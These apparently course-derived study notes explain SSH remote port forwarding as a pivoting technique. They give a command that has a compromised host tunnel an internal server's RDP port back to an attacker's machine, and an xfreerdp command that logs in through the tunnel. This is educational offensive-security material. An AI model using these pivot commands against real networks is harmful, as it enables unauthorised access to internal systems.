---
title: 5.3 Remote Port Forwarding
updated: 2023-04-23T19:14:45.0000000+04:00
created: 2023-04-18T11:31:19.0000000+04:00
---

AM
1.  Remote port forwarding allows you to take a reachable port from the SSH client (in this case, PC-1) and project it into a remote SSH server (the attacker's machine).

2.  As a result, a port will be opened in the attacker's machine that can be used to connect back to port 3389 in the server through the SSH tunnel. PC-1 will, in turn, proxy the connection so that the server will see all the traffic as if it was coming from PC-1:

![image1](image1-112.png)

3.  A valid question that might pop up by this point is why we need port forwarding if we have compromised PC-1 and can run an RDP session directly from there. The answer is simple: in a situation where we only have console access to PC-1, we won't be able to use any RDP client as we don't have a GUI. By making the port available to your attacker's machine, you can use a Linux RDP client to connect. Similar situations arise when you want to run an exploit against a port that can't be reached directly, as your exploit may require a specific scripting language that may not always be available at machines you compromise along the way.

Referring to the previous image,

## forward port 3389 on the server back to our attacker's machine, we can use the following command on PC-1:

| Command | ssh tunneluser@1.1.1.1 -R 3389:3.3.3.3:3389 -N |
|---------|------------------------------------------------|

![image2](image2-53.png)

- This will establish an SSH session from PC-1 to 1.1.1.1 (Attacker PC) using the tunneluser user.

- Since the tunneluser isn't allowed to run a shell on the Attacker PC, we need to run the ssh command

- -N switch to prevent the client from requesting one, or the connection will exit immediately.

- The -R switch is used to request a remote port forward, and the syntax requires us first to indicate the port we will be opening at the SSH server (3389), followed by a colon and then the IP and port of the socket we'll be forwarding (3.3.3.3:3389). Notice that the port numbers don't need to match, although they do in this example.

- The command itself won't output anything, but the tunnel will depend on the command to be running. Whenever we want, we can close the tunnel by pressing CTRL+C as with any other command.

## RDP into server

Once our tunnel is set and running, we can go to the attacker's machine and RDP into the forwarded port to reach the server:

| Command | xfreerdp /v:127.0.0.1 /u:MyUser /p:MyPassword |
|---------|-----------------------------------------------|

![image3](image3-37.png)

